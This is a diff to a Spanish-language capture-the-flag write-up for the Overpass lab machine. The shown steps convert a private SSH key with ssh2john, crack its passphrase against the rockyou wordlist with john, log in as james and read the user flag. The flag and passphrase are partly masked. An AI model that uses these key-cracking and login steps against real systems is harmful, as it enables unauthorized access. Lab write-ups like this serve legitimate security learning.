@@ -144,7 +144,57 @@ Nos pide passphrase para la id_rsa, cosa que no tenemos.
 
 -Intentamos Crakear la pass de is_rsa.
 
-  1)
+  1)Convertimos id_rsa a un formato entendible para john
+  
+    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/overpass/files]
+    └─# ssh2john id_rsa > john_id_rsa
+
+  2)Crakeamos john_id_rsa
+
+    ┌──(root㉿kali)-[~kali/…/ctf/try_ctf/overpass/contend]
+		└─# john john_idrsa --wordlist=/usr/share/wordlists/rockyou.txt 
+		Using default input encoding: UTF-8
+		Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+		Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+		Cost 2 (iteration count) is 1 for all loaded hashes
+		Will run 3 OpenMP threads
+		Press 'q' or Ctrl-C to abort, almost any other key for status
+		james----13          (id_rsa)  
+
+  3)Obtenemos session en la maquina victima mediante SSH.
+
+    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/overpass/files]
+    └─# ssh -i id_rsa james@10.10.246.94
+    Enter passphrase for key 'id_rsa': 
+    Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
+    
+     * Documentation:  https://help.ubuntu.com
+     * Management:     https://landscape.canonical.com
+     * Support:        https://ubuntu.com/advantage
+    
+      System information as of Mon Nov 13 05:59:54 UTC 2023
+    
+      System load:  0.0                Processes:           88
+      Usage of /:   22.3% of 18.57GB   Users logged in:     0
+      Memory usage: 12%                IP address for eth0: 10.10.246.94
+      Swap usage:   0%
+    
+    
+    47 packages can be updated.
+    0 updates are security updates.
+    
+    
+    Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
+    james@overpass-prod:~$ whoami
+    james
+
+## Obtenemos Flag y elevamos privilegios
+
+-Leemos flag de usuario.
+
+    james@overpass-prod:~$ cat user.txt 
+    thm{65c1aaf000506e56-------1e6bf7}
+
 
 
 
